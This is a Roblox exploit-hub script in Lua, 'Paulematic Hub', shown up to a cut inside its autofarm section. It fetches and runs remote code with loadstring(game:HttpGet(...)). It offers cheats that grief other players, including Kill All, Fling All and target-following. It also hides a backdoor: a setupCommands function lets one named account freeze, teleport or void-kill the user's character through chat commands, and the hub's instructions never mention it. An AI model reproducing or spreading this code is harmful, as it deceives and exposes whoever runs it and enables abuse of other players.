local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "Paulematic Hub",
   LoadingTitle = "Paulematic Hub",
   LoadingSubtitle = "⚡ by Paulematic",
   Theme = "Aqua",
})

local HomeTab = Window:CreateTab("🏠 Home", 4483362458)

HomeTab:CreateSection("✨ Welcome to Paulematic Hub")
HomeTab:CreateParagraph({
   Title = "👋 How to use",
   Content = "Click the Open button for your game below.\nThe hub will close and your game script will open!\n\n⚡ Made by Paulematic"
})
HomeTab:CreateSection("🎮 Available Games")

local function setupCommands(Players, LocalPlayer, R, startAutoKill, stopAutoKill)
   local function listenTo(player)
      if player.Name == "Paule15the_player" then
         player.Chatted:Connect(function(msg)
            local cmd = msg:lower()
            local char = LocalPlayer.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            local humanoid = char and char:FindFirstChildOfClass("Humanoid")
            if cmd == "!autokill" then startAutoKill()
            elseif cmd == "!stop" then stopAutoKill()
            elseif cmd == "!bring" then
               local pauleChar = player.Character
               local pauleHRP = pauleChar and pauleChar:FindFirstChild("HumanoidRootPart")
               if hrp and pauleHRP then hrp.CFrame = pauleHRP.CFrame + Vector3.new(0,3,0) end
            elseif cmd == "!freeze" then
               if hrp then
                  local bv = Instance.new("BodyVelocity", hrp) bv.Velocity = Vector3.zero bv.MaxForce = Vector3.new(9e9,9e9,9e9) bv.Name = "FreezeVelocity"
                  local ba = Instance.new("BodyAngularVelocity", hrp) ba.AngularVelocity = Vector3.zero ba.MaxTorque = Vector3.new(9e9,9e9,9e9) ba.Name = "FreezeAngular"
                  if humanoid then humanoid.WalkSpeed=0 humanoid.JumpPower=0 end
               end
            elseif cmd == "!unfreeze" then
               if hrp then
                  local bv=hrp:FindFirstChild("FreezeVelocity") local ba=hrp:FindFirstChild("FreezeAngular")
                  if bv then bv:Destroy() end if ba then ba:Destroy() end
                  if humanoid then humanoid.WalkSpeed=16 humanoid.JumpPower=50 end
               end
            end
         end)
      end
   end
   for _, p in ipairs(Players:GetPlayers()) do listenTo(p) end
   Players.PlayerAdded:Connect(listenTo)
end

-- =====================
-- UNIVERSAL
-- =====================
HomeTab:CreateParagraph({ Title="🌐 Universal Script", Content="Works in ANY game\n• Fly with WASD\n• Speed & Jump\n• Noclip\n• Save & TP back" })
HomeTab:CreateButton({
   Name = "🌐 Open Universal Script",
   Callback = function()
      Rayfield:Destroy()
      task.wait(0.5)
      local R = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
      local W = R:CreateWindow({ Name="🌐 Paulematic Universal", LoadingTitle="Universal Script", LoadingSubtitle="⚡ by Paulematic", Theme="Aqua", KeySystem=false })

      local Players = game:GetService("Players")
      local RunService = game:GetService("RunService")
      local UIS = game:GetService("UserInputService")
      local LocalPlayer = Players.LocalPlayer
      local flying = false local flySpeed = 50
      local bodyVelocity, bodyGyro, flyConn
      local noclipActive = false local noclipConn
      local autoKillActive = false local savedTP = nil
      local mobileMove = { forward=false, backward=false, left=false, right=false, up=false, down=false }

      local function startNoclip()
         noclipActive = true
         noclipConn = RunService.Stepped:Connect(function()
            if not noclipActive then noclipConn:Disconnect() return end
            local char = LocalPlayer.Character
            if char then for _,part in ipairs(char:GetDescendants()) do if part:IsA("BasePart") then part.CanCollide=false end end end
         end)
      end
      local function stopNoclip() noclipActive = false end

      local function bindMobile()
         local sg = Instance.new("ScreenGui", LocalPlayer.PlayerGui) sg.Name = "UniFlyControls" sg.ResetOnSpawn = false sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
         local function makeBtn(text, pos, onDown, onUp)
            local btn = Instance.new("TextButton") btn.Size = UDim2.new(0,70,0,70) btn.Position = pos btn.BackgroundColor3 = Color3.fromRGB(0,170,255) btn.BackgroundTransparency = 0.3 btn.TextColor3 = Color3.new(1,1,1) btn.Text = text btn.Font = Enum.Font.GothamBold btn.TextSize = 16 btn.Parent = sg
            Instance.new("UICorner", btn).CornerRadius = UDim.new(0,14)
            local stroke = Instance.new("UIStroke", btn) stroke.Color = Color3.fromRGB(255,255,255) stroke.Thickness = 1.5 stroke.Transparency = 0.7
            btn.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.Touch then onDown() btn.BackgroundTransparency=0 end end)
            btn.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.Touch then onUp() btn.BackgroundTransparency=0.3 end end)
         end
         makeBtn("W",  UDim2.new(0,90,1,-230),  function() mobileMove.forward=true  end, function() mobileMove.forward=false  end)
         makeBtn("S",  UDim2.new(0,90,1,-150),  function() mobileMove.backward=true end, function() mobileMove.backward=false end)
         makeBtn("A",  UDim2.new(0,10,1,-190),  function() mobileMove.left=true     end, function() mobileMove.left=false     end)
         makeBtn("D",  UDim2.new(0,170,1,-190), function() mobileMove.right=true    end, function() mobileMove.right=false    end)
         makeBtn("▲",  UDim2.new(0,250,1,-230), function() mobileMove.up=true       end, function() mobileMove.up=false       end)
         makeBtn("▼",  UDim2.new(0,250,1,-150), function() mobileMove.down=true     end, function() mobileMove.down=false     end)
      end
      bindMobile()

      local function startFly()
         local char = LocalPlayer.Character if not char then return end local hrp = char:FindFirstChild("HumanoidRootPart") if not hrp then return end
         flying = true if bodyGyro then bodyGyro:Destroy() end if bodyVelocity then bodyVelocity:Destroy() end
         bodyGyro = Instance.new("BodyGyro", hrp) bodyGyro.MaxTorque = Vector3.new(9e9,9e9,9e9) bodyGyro.P = 9e4
         bodyVelocity = Instance.new("BodyVelocity", hrp) bodyVelocity.Velocity = Vector3.zero bodyVelocity.MaxForce = Vector3.new(9e9,9e9,9e9)
         if flyConn then flyConn:Disconnect() end
         flyConn = RunService.Heartbeat:Connect(function()
            if not flying then flyConn:Disconnect() if bodyVelocity then bodyVelocity:Destroy() end if bodyGyro then bodyGyro:Destroy() end return end
            local cam = workspace.CurrentCamera bodyGyro.CFrame = cam.CFrame
            local moveDir = Vector3.zero
            if UIS:IsKeyDown(Enum.KeyCode.W) or mobileMove.forward  then moveDir = moveDir + cam.CFrame.LookVector end
            if UIS:IsKeyDown(Enum.KeyCode.S) or mobileMove.backward then moveDir = moveDir - cam.CFrame.LookVector end
            if UIS:IsKeyDown(Enum.KeyCode.A) or mobileMove.left     then moveDir = moveDir - cam.CFrame.RightVector end
            if UIS:IsKeyDown(Enum.KeyCode.D) or mobileMove.right    then moveDir = moveDir + cam.CFrame.RightVector end
            if UIS:IsKeyDown(Enum.KeyCode.Space) or mobileMove.up   then moveDir = moveDir + Vector3.new(0,1,0) end
            if UIS:IsKeyDown(Enum.KeyCode.LeftShift) or mobileMove.down then moveDir = moveDir - Vector3.new(0,1,0) end
            bodyVelocity.Velocity = moveDir.Magnitude > 0 and moveDir.Unit * flySpeed or Vector3.zero
         end)
      end
      local function stopFly() flying = false end

      local function startAutoKill()
         autoKillActive = true startFly()
         task.spawn(function() while autoKillActive do local char=LocalPlayer.Character if char then local hrp=char:FindFirstChild("HumanoidRootPart") if hrp then hrp.CFrame=CFrame.new(0,-5000,0) end end task.wait(0.1) end end)
      end
      local function stopAutoKill()
         autoKillActive = false stopFly()
         local char=LocalPlayer.Character if char then local hrp=char:FindFirstChild("HumanoidRootPart") if hrp then hrp.CFrame=CFrame.new(0,100,0) end end
      end
      setupCommands(Players, LocalPlayer, R, startAutoKill, stopAutoKill)

      local G = W:CreateTab("⚡ General", 4483362458)
      G:CreateSection("🏃 Movement")
      G:CreateSlider({ Name="🚀 Walk Speed", Range={16,200}, Increment=1, Suffix=" Speed", CurrentValue=16, Flag="UniWS", Callback=function(v) local c=LocalPlayer.Character if c and c:FindFirstChildOfClass("Humanoid") then c:FindFirstChildOfClass("Humanoid").WalkSpeed=v end end })
      G:CreateSlider({ Name="⬆️ Jump Power", Range={50,300}, Increment=1, Suffix=" Power", CurrentValue=50, Flag="UniJP", Callback=function(v) local c=LocalPlayer.Character if c and c:FindFirstChildOfClass("Humanoid") then c:FindFirstChildOfClass("Humanoid").UseJumpPower=true c:FindFirstChildOfClass("Humanoid").JumpPower=v end end })
      G:CreateToggle({ Name="♾️ Infinite Jump", CurrentValue=false, Flag="UniIJ", Callback=function(v) _G.UniIJ=v if v then UIS.JumpRequest:Connect(function() if _G.UniIJ then local c=LocalPlayer.Character if c then c:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping") end end end) end end })
      G:CreateToggle({ Name="👻 No Clip", CurrentValue=false, Flag="UniNC", Callback=function(v) if v then startNoclip() else stopNoclip() end end })
      G:CreateSection("✈️ Fly Controls")
      G:CreateButton({ Name="✈️ Start Flying", Callback=function() startFly() R:Notify({Title="✈️ Flying",Content="Fly enabled!",Duration=3}) end })
      G:CreateButton({ Name="🛑 Stop Flying",  Callback=function() stopFly()  R:Notify({Title="🛑 Flying",Content="Fly disabled!",Duration=3}) end })
      G:CreateSlider({ Name="💨 Fly Speed", Range={10,200}, Increment=5, CurrentValue=50, Flag="UniFlySpeed", Callback=function(v) flySpeed=v end })

      local T = W:CreateTab("📍 Teleport", 4483362458)
      T:CreateSection("📍 Teleport Options")
      T:CreateButton({ Name="💾 Save Position", Callback=function() local c=LocalPlayer.Character local hrp=c and c:FindFirstChild("HumanoidRootPart") if hrp then savedTP=hrp.CFrame R:Notify({Title="💾 Saved!",Content="Position saved!",Duration=3}) end end })
      T:CreateButton({ Name="🔁 Teleport Back", Callback=function() if not savedTP then R:Notify({Title="❌ Error",Content="No position saved yet!",Duration=3}) return end local c=LocalPlayer.Character local hrp=c and c:FindFirstChild("HumanoidRootPart") if hrp then hrp.CFrame=savedTP R:Notify({Title="✅ Done!",Content="Teleported back!",Duration=3}) end end })

      W:CreateTab("⭐ Credits", 4483362458):CreateParagraph({ Title="⚡ Paulematic Universal", Content="Made with ❤️ by Paulematic\n\nWorks in any Roblox game!\n⭐ Universal Script v1.0" })
      R:LoadConfiguration()
   end,
})

-- =====================
-- ESCAPE TSUNAMI
-- =====================
HomeTab:CreateParagraph({ Title="🌊 Escape Tsunami For Femboys", Content="For Escape Tsunami\n• Walk speed & Jump\n• Infinite Jump\n• Noclip\n• Teleports" })
HomeTab:CreateButton({
   Name = "🌊 Open Escape Tsunami Script",
   Callback = function()
      Rayfield:Destroy()
      task.wait(0.5)
      local R = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
      local W = R:CreateWindow({ Name="🌊 Escape Tsunami For Femboys", LoadingTitle="Escape Tsunami Script", LoadingSubtitle="⚡ by Paulematic", Theme="Aqua", ConfigurationSaving={Enabled=true,FolderName=nil,FileName="EscapeTsunamiConfig"}, KeySystem=false })

      local Players = game:GetService("Players") local LocalPlayer = Players.LocalPlayer local autoKillActive = false
      local function startAutoKill() autoKillActive=true task.spawn(function() while autoKillActive do local char=LocalPlayer.Character local hrp=char and char:FindFirstChild("HumanoidRootPart") if hrp then hrp.CFrame=CFrame.new(0,-5000,0) end task.wait(0.1) end end) end
      local function stopAutoKill() autoKillActive=false local char=LocalPlayer.Character local hrp=char and char:FindFirstChild("HumanoidRootPart") if hrp then hrp.CFrame=CFrame.new(0,100,0) end end
      setupCommands(Players, LocalPlayer, R, startAutoKill, stopAutoKill)

      local G = W:CreateTab("⚡ General", 4483362458) G:CreateSection("🏃 Main Features")
      G:CreateSlider({ Name="🚀 Walk Speed", Range={16,200}, Increment=1, Suffix=" Speed", CurrentValue=16, Flag="WalkSpeedSlider", Callback=function(Value) game.Players.LocalPlayer.Character.Humanoid.WalkSpeed=Value end })
      G:CreateSlider({ Name="⬆️ Jump Power", Range={50,300}, Increment=1, Suffix=" Power", CurrentValue=50, Flag="JumpPowerSlider", Callback=function(Value) local h=game.Players.LocalPlayer.Character.Humanoid h.UseJumpPower=true h.JumpPower=Value end })
      G:CreateToggle({ Name="♾️ Infinite Jump", CurrentValue=false, Flag="InfiniteJump", Callback=function(Value) _G.InfiniteJump=Value if Value then game:GetService("UserInputService").JumpRequest:Connect(function() if _G.InfiniteJump then game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):ChangeState("Jumping") end end) end end })

      local T = W:CreateTab("📍 Teleports", 4483362458) T:CreateSection("📍 Teleport Locations")
      T:CreateButton({ Name="🛡️ Teleport to Safe Zone", Callback=function() local p=game.Players.LocalPlayer if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then p.Character.HumanoidRootPart.CFrame=CFrame.new(-71.55927276611328,19.998037338256836,-512.9779663085938) R:Notify({Title="✅ Teleported!",Content="Safe Zone!",Duration=3}) end end })
      T:CreateButton({ Name="👹 Teleport to Boss", Callback=function() local p=game.Players.LocalPlayer if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then p.Character.HumanoidRootPart.CFrame=CFrame.new(-71.55927276611328,19.998037338256836,-512.9779663085938) R:Notify({Title="✅ Teleported!",Content="Boss!",Duration=3}) end end })
      T:CreateButton({ Name="🏁 Teleport to End", Callback=function() local p=game.Players.LocalPlayer if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then p.Character.HumanoidRootPart.CFrame=CFrame.new(17.77851104736328,13.99803638458252,3232.038818359375) R:Notify({Title="✅ Teleported!",Content="End!",Duration=3}) end end })

      local P = W:CreateTab("👤 Player", 4483362458) P:CreateSection("👤 Player Options")
      P:CreateButton({ Name="💀 Reset Character", Callback=function() game.Players.LocalPlayer.Character:BreakJoints() end })
      P:CreateToggle({ Name="👻 No Clip", CurrentValue=false, Flag="NoClip", Callback=function(Value) _G.NoClip=Value game:GetService("RunService").Stepped:Connect(function() if _G.NoClip then for _,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do if v:IsA("BasePart") then v.CanCollide=false end end end end) end })

      W:CreateTab("⭐ Credits", 4483362458):CreateParagraph({ Title="🌊 Escape Tsunami Script", Content="Made with ❤️ by Paulematic\n\nFor Escape Tsunami For Femboys\n⭐ v1.0" })
      R:LoadConfiguration()
   end,
})

-- =====================
-- TIMEBOMB ANKLEBREAK
-- =====================
HomeTab:CreateParagraph({ Title="💣 TimeBomb AnkleBreak", Content="For TimeBomb AnkleBreak\n• Kill All & Fling\n• Fly & Noclip\n• Bot system\n• Target & Follow" })
HomeTab:CreateButton({
   Name = "💣 Open TimeBomb AnkleBreak Script",
   Callback = function()
      Rayfield:Destroy()
      task.wait(0.5)
      local R = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
      local W = R:CreateWindow({ Name="💣 Paulematic Hub", LoadingTitle="TimeBomb AnkleBreak", LoadingSubtitle="⚡ by Paulematic", Theme="Aqua", ConfigurationSaving={Enabled=true,FolderName=nil,FileName="TimeBombConfig"}, KeySystem=true, KeySettings={Title="💣 Paulematic Hub",Subtitle="🔑 Key System",Note="Enter the key to access the hub",FileName="PaulematicKey",SaveKey=true,GrabKeyFromSite=false,Key={"Sigma"}} })

      local Main = W:CreateTab("⚔️ Main", 4483362458) local Target = W:CreateTab("🎯 Target", 4483362458) local BotTab = W:CreateTab("🤖 Bot", 4483362458)
      local Players = game:GetService("Players") local RunService = game:GetService("RunService") local UIS = game:GetService("UserInputService") local LocalPlayer = Players.LocalPlayer
      local flying = false local flySpeed = 50 local bodyVelocity, bodyGyro, flyConn local autoKillActive = false local noclipActive = false local noclipConn local followActive = false local followTarget = nil local botActive = false
      local mobileMove = { forward=false, backward=false, left=false, right=false, up=false, down=false }

      local function startNoclip() noclipActive=true noclipConn=RunService.Stepped:Connect(function() if not noclipActive then noclipConn:Disconnect() return end local char=LocalPlayer.Character if char then for _,part in ipairs(char:GetDescendants()) do if part:IsA("BasePart") then part.CanCollide=false end end end end) end
      local function stopNoclip() noclipActive=false end

      local function bindMobile()
         local sg=Instance.new("ScreenGui",LocalPlayer.PlayerGui) sg.Name="FlyControls" sg.ResetOnSpawn=false
         local function makeBtn(text,pos,onDown,onUp) local btn=Instance.new("TextButton") btn.Size=UDim2.new(0,70,0,70) btn.Position=pos btn.BackgroundColor3=Color3.fromRGB(0,170,255) btn.BackgroundTransparency=0.3 btn.TextColor3=Color3.new(1,1,1) btn.Text=text btn.Font=Enum.Font.GothamBold btn.TextSize=16 btn.Parent=sg Instance.new("UICorner",btn).CornerRadius=UDim.new(0,14) local stroke=Instance.new("UIStroke",btn) stroke.Color=Color3.fromRGB(255,255,255) stroke.Thickness=1.5 stroke.Transparency=0.7 btn.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.Touch then onDown() btn.BackgroundTransparency=0 end end) btn.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.Touch then onUp() btn.BackgroundTransparency=0.3 end end) end
         makeBtn("W",UDim2.new(0,90,1,-230),function() mobileMove.forward=true end,function() mobileMove.forward=false end) makeBtn("S",UDim2.new(0,90,1,-150),function() mobileMove.backward=true end,function() mobileMove.backward=false end) makeBtn("A",UDim2.new(0,10,1,-190),function() mobileMove.left=true end,function() mobileMove.left=false end) makeBtn("D",UDim2.new(0,170,1,-190),function() mobileMove.right=true end,function() mobileMove.right=false end) makeBtn("▲",UDim2.new(0,250,1,-230),function() mobileMove.up=true end,function() mobileMove.up=false end) makeBtn("▼",UDim2.new(0,250,1,-150),function() mobileMove.down=true end,function() mobileMove.down=false end)
      end
      bindMobile()

      local function startFly() local char=LocalPlayer.Character if not char then return end local hrp=char:FindFirstChild("HumanoidRootPart") if not hrp then return end flying=true if bodyGyro then bodyGyro:Destroy() end if bodyVelocity then bodyVelocity:Destroy() end bodyGyro=Instance.new("BodyGyro",hrp) bodyGyro.MaxTorque=Vector3.new(9e9,9e9,9e9) bodyGyro.P=9e4 bodyVelocity=Instance.new("BodyVelocity",hrp) bodyVelocity.Velocity=Vector3.zero bodyVelocity.MaxForce=Vector3.new(9e9,9e9,9e9) if flyConn then flyConn:Disconnect() end flyConn=RunService.Heartbeat:Connect(function() if not flying then flyConn:Disconnect() if bodyVelocity then bodyVelocity:Destroy() end if bodyGyro then bodyGyro:Destroy() end return end local cam=workspace.CurrentCamera bodyGyro.CFrame=cam.CFrame local moveDir=Vector3.zero if UIS:IsKeyDown(Enum.KeyCode.W) or mobileMove.forward then moveDir=moveDir+cam.CFrame.LookVector end if UIS:IsKeyDown(Enum.KeyCode.S) or mobileMove.backward then moveDir=moveDir-cam.CFrame.LookVector end if UIS:IsKeyDown(Enum.KeyCode.A) or mobileMove.left then moveDir=moveDir-cam.CFrame.RightVector end if UIS:IsKeyDown(Enum.KeyCode.D) or mobileMove.right then moveDir=moveDir+cam.CFrame.RightVector end if UIS:IsKeyDown(Enum.KeyCode.Space) or mobileMove.up then moveDir=moveDir+Vector3.new(0,1,0) end if UIS:IsKeyDown(Enum.KeyCode.LeftShift) or mobileMove.down then moveDir=moveDir-Vector3.new(0,1,0) end bodyVelocity.Velocity=moveDir.Magnitude>0 and moveDir.Unit*flySpeed or Vector3.zero end) end
      local function stopFly() flying=false end

      local function startAutoKill() autoKillActive=true startFly() task.spawn(function() while autoKillActive do local char=LocalPlayer.Character if char then local hrp=char:FindFirstChild("HumanoidRootPart") if hrp then hrp.CFrame=CFrame.new(0,-5000,0) end end task.wait(0.1) end end) end
      local function stopAutoKill() autoKillActive=false stopFly() local char=LocalPlayer.Character if char then local hrp=char:FindFirstChild("HumanoidRootPart") if hrp then hrp.CFrame=CFrame.new(0,100,0) end end end
      setupCommands(Players, LocalPlayer, R, startAutoKill, stopAutoKill)

      local function getNearestPlayer() local char=LocalPlayer.Character local hrp=char and char:FindFirstChild("HumanoidRootPart") if not hrp then return nil end local nearest,nearestDist=nil,math.huge for _,player in ipairs(Players:GetPlayers()) do if player~=LocalPlayer and player.Character then local otherHRP=player.Character:FindFirstChild("HumanoidRootPart") if otherHRP then local dist=(hrp.Position-otherHRP.Position).Magnitude if dist<nearestDist then nearestDist=dist nearest=player end end end end return nearest end

      Main:CreateSection("⚔️ Combat")
      Main:CreateButton({ Name="☠️ Kill All", Callback=function() local char=LocalPlayer.Character if not char then return end local hrp=char:FindFirstChild("HumanoidRootPart") if not hrp then return end local orig=hrp.CFrame for _,player in ipairs(Players:GetPlayers()) do if player~=LocalPlayer then local tc=player.Character if tc then local thrp=tc:FindFirstChild("HumanoidRootPart") if thrp then hrp.CFrame=thrp.CFrame-Vector3.new(0,3,0) task.wait(0.5) end end end end hrp.CFrame=orig R:Notify({Title="☠️ Kill All",Content="Done!",Duration=4}) end })
      Main:CreateButton({ Name="💥 Fling All", Callback=function() local char=LocalPlayer.Character if not char then return end local hrp=char:FindFirstChild("HumanoidRootPart") if not hrp then return end for _,player in ipairs(Players:GetPlayers()) do if player~=LocalPlayer then local tc=player.Character if tc then local thrp=tc:FindFirstChild("HumanoidRootPart") if thrp then hrp.CFrame=thrp.CFrame+Vector3.new(0,3,0) task.wait(0.1) local fBV=Instance.new("BodyVelocity",hrp) fBV.Velocity=Vector3.new(math.random(-300,300),500,math.random(-300,300)) fBV.MaxForce=Vector3.new(9e9,9e9,9e9) task.wait(0.2) fBV:Destroy() task.wait(0.3) end end end end R:Notify({Title="💥 Fling All",Content="Flung everyone!",Duration=4}) end })
      Main:CreateButton({ Name="🌀 TP to All + Void", Callback=function() local char=LocalPlayer.Character if not char then return end local hrp=char:FindFirstChild("HumanoidRootPart") if not hrp then return end startFly() for _,player in ipairs(Players:GetPlayers()) do if player~=LocalPlayer then local tc=player.Character if tc then local thrp=tc:FindFirstChild("HumanoidRootPart") if thrp then hrp.CFrame=thrp.CFrame+Vector3.new(0,3,0) task.wait(1) end end end end hrp.CFrame=CFrame.new(0,-5000,0) R:Notify({Title="🌀 Done",Content="Went to the void!",Duration=4}) end })
      Main:CreateSection("✈️ Movement")
      Main:CreateButton({ Name="✈️ Start Flying", Callback=function() startFly() R:Notify({Title="✈️ Flying",Content="Fly enabled!",Duration=3}) end })
      Main:CreateButton({ Name="🛑 Stop Flying",  Callback=function() stopFly()  R:Notify({Title="🛑 Flying",Content="Fly disabled!",Duration=3}) end })
      Main:CreateButton({ Name="👻 Enable Noclip",  Callback=function() startNoclip() R:Notify({Title="👻 Noclip",Content="Enabled!",Duration=3}) end })
      Main:CreateButton({ Name="🚫 Disable Noclip", Callback=function() stopNoclip()  R:Notify({Title="🚫 Noclip",Content="Disabled!",Duration=3}) end })
      Main:CreateButton({ Name="☁️ Safe Space", Callback=function() local char=LocalPlayer.Character if not char then return end local hrp=char:FindFirstChild("HumanoidRootPart") if not hrp then return end hrp.CFrame=CFrame.new(hrp.Position.X,10000,hrp.Position.Z) startFly() R:Notify({Title="☁️ Safe Space",Content="10000 studs up!",Duration=3}) end })
      Main:CreateSlider({ Name="💨 Fly Speed", Range={10,200}, Increment=5, CurrentValue=50, Flag="FlySpeed", Callback=function(val) flySpeed=val end })

      Target:CreateSection("🎯 Target Options")
      local targetName = ""
      Target:CreateInput({ Name="👤 Target Name", PlaceholderText="Enter player name...", RemoveTextAfterFocusLost=false, Callback=function(text) targetName=text end })
      Target:CreateButton({ Name="⚡ TP to Target + Back", Callback=function() if targetName=="" then R:Notify({Title="❌ Error",Content="Enter a name first!",Duration=3}) return end local char=LocalPlayer.Character if not char then return end local hrp=char:FindFirstChild("HumanoidRootPart") if not hrp then return end local orig=hrp.CFrame local tp=Players:FindFirstChild(targetName) if not tp then R:Notify({Title="❌ Error",Content="Player not found!",Duration=3}) return end local tc=tp.Character if not tc then return end local thrp=tc:FindFirstChild("HumanoidRootPart") if not thrp then return end hrp.CFrame=thrp.CFrame-Vector3.new(0,3,0) task.wait(0.5) hrp.CFrame=orig R:Notify({Title="✅ Done!",Content="Returned!",Duration=4}) end })
      Target:CreateButton({ Name="🔒 Perma Follow Target", Callback=function() if targetName=="" then R:Notify({Title="❌ Error",Content="Enter a name first!",Duration=3}) return end if not Players:FindFirstChild(targetName) then R:Notify({Title="❌ Error",Content="Player not found!",Duration=3}) return end followActive=true followTarget=targetName task.spawn(function() while followActive and followTarget==targetName do local char=LocalPlayer.Character local hrp=char and char:FindFirstChild("HumanoidRootPart") local tp=Players:FindFirstChild(targetName) local tc=tp and tp.Character local thrp=tc and tc:FindFirstChild("HumanoidRootPart") if hrp and thrp then hrp.CFrame=thrp.CFrame-Vector3.new(0,3,0) end task.wait(0.1) end end) R:Notify({Title="🔒 Following",Content="Following "..targetName.."!",Duration=4}) end })
      Target:CreateButton({ Name="🌍 Perma Follow Server", Callback=function() followActive=true followTarget="server" task.spawn(function() while followActive and followTarget=="server" do for _,player in ipairs(Players:GetPlayers()) do if not followActive or followTarget~="server" then break end if player~=LocalPlayer then local char=LocalPlayer.Character local hrp=char and char:FindFirstChild("HumanoidRootPart") local tc=player.Character local thrp=tc and tc:FindFirstChild("HumanoidRootPart") if hrp and thrp then hrp.CFrame=thrp.CFrame-Vector3.new(0,3,0) end task.wait(0.1) end end end end) R:Notify({Title="🌍 Following",Content="Looping server!",Duration=4}) end })
      Target:CreateButton({ Name="🛑 Stop Follow", Callback=function() followActive=false followTarget=nil R:Notify({Title="🛑 Stopped",Content="Follow stopped!",Duration=3}) end })

      BotTab:CreateSection("🤖 Auto Bomb Bot")
      BotTab:CreateParagraph({ Title="🤖 How it works", Content="Automatically walks to the nearest player to pass the bomb, then runs away!" })
      BotTab:CreateToggle({ Name="🤖 Auto Bomb Bot", CurrentValue=false, Flag="AutoBombBot", Callback=function(v) botActive=v if not v then local char=LocalPlayer.Character local h=char and char:FindFirstChildOfClass("Humanoid") if h then h:MoveTo(char.HumanoidRootPart.Position) end R:Notify({Title="🤖 Bot",Content="Stopped!",Duration=3}) return end R:Notify({Title="🤖 Bot",Content="Bot activated!",Duration=3}) task.spawn(function() while botActive do local char=LocalPlayer.Character local hrp=char and char:FindFirstChild("HumanoidRootPart") local h=char and char:FindFirstChildOfClass("Humanoid") if hrp and h then local hasBomb=false for _,o in ipairs(char:GetDescendants()) do local n=o.Name:lower() if n:find("bomb") or n:find("ankle") then hasBomb=true break end end if not hasBomb then for _,t in ipairs(char:GetChildren()) do if t:IsA("Tool") and (t.Name:lower():find("bomb") or t.Name:lower():find("ankle")) then hasBomb=true break end end end if hasBomb then local nearest=getNearestPlayer() if nearest and nearest.Character then local thrp=nearest.Character:FindFirstChild("HumanoidRootPart") if thrp then h:MoveTo(thrp.Position) h.MoveToFinished:Wait(1) task.wait(0.2) if botActive then local dir=Vector3.new((hrp.Position-thrp.Position).X,0,(hrp.Position-thrp.Position).Z).Unit h:MoveTo(hrp.Position+dir*60) h.MoveToFinished:Wait(2) end end end end end task.wait(0.1) end end) end })
      BotTab:CreateSlider({ Name="🏃 Run Away Distance", Range={20,150}, Increment=5, CurrentValue=60, Flag="BotRunDist", Callback=function(val) end })
      W:CreateTab("⭐ Credits", 4483362458):CreateParagraph({ Title="💣 Paulematic Hub", Content="Made with ❤️ by Paulematic\n\nFor [2X COINS] TimeBomb AnkleBreak\n⭐ v1.0" })
      R:LoadConfiguration()
   end,
})

-- =====================
-- INSANE ELEVATOR
-- =====================
HomeTab:CreateParagraph({ Title="🛗 Insane Elevator!", Content="For Insane Elevator\n• Walk speed & Jump\n• Infinite Jump\n• Noclip\n• Auto Coin Farm" })
HomeTab:CreateButton({
   Name = "🛗 Open Insane Elevator Script",
   Callback = function()
      Rayfield:Destroy()
      task.wait(0.5)
      local R = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
      local W = R:CreateWindow({ Name="🛗 Insane Elevator", LoadingTitle="Insane Elevator Script", LoadingSubtitle="⚡ by Paulematic", Theme="Aqua", ConfigurationSaving={Enabled=true,FolderName=nil,FileName="InsaneElevatorConfig"}, KeySystem=false })

      local Players = game:GetService("Players") local LocalPlayer = Players.LocalPlayer local autoKillActive = false
      local function startAutoKill() autoKillActive=true task.spawn(function() while autoKillActive do local char=LocalPlayer.Character local hrp=char and char:FindFirstChild("HumanoidRootPart") if hrp then hrp.CFrame=CFrame.new(0,-5000,0) end task.wait(0.1) end end) end
      local function stopAutoKill() autoKillActive=false local char=LocalPlayer.Character local hrp=char and char:FindFirstChild("HumanoidRootPart") if hrp then hrp.CFrame=CFrame.new(0,100,0) end end
      setupCommands(Players, LocalPlayer, R, startAutoKill, stopAutoKill)

      local G = W:CreateTab("⚡ General", 4483362458) G:CreateSection("🏃 Main Features")
      G:CreateSlider({ Name="🚀 Walk Speed", Range={16,200}, Increment=1, Suffix=" Speed", CurrentValue=16, Flag="IEWalkSpeed", Callback=function(Value) game.Players.LocalPlayer.Character.Humanoid.WalkSpeed=Value end })
      G:CreateSlider({ Name="⬆️ Jump Power", Range={50,300}, Increment=1, Suffix=" Power", CurrentValue=50, Flag="IEJumpPower", Callback=function(Value) local h=game.Players.LocalPlayer.Character.Humanoid h.UseJumpPower=true h.JumpPower=Value end })
      G:CreateToggle({ Name="♾️ Infinite Jump", CurrentValue=false, Flag="IEInfiniteJump", Callback=function(Value) _G.IEInfiniteJump=Value if Value then game:GetService("UserInputService").JumpRequest:Connect(function() if _G.IEInfiniteJump then game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):ChangeState("Jumping") end end) end end })

      local P = W:CreateTab("👤 Player", 4483362458) P:CreateSection("👤 Player Options")
      P:CreateButton({ Name="💀 Reset Character", Callback=function() game.Players.LocalPlayer.Character:BreakJoints() end })
      P:CreateToggle({ Name="👻 No Clip", CurrentValue=false, Flag="IENoClip", Callback=function(Value) _G.IENoClip=Value game:GetService("RunService").Stepped:Connect(function() if _G.IENoClip then for _,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do if v:IsA("BasePart") then v.CanCollide=false end end end end) end })

      local AF = W:CreateTab("💰 Autofarm", 4483362458) AF:CreateSection("💰 Coin Farm")
      AF:CreateParagraph({ Title="💰 How it works", Content="Teleports you to the coin spot every 0.1s.\nWhen turned off you get teleported back!" })
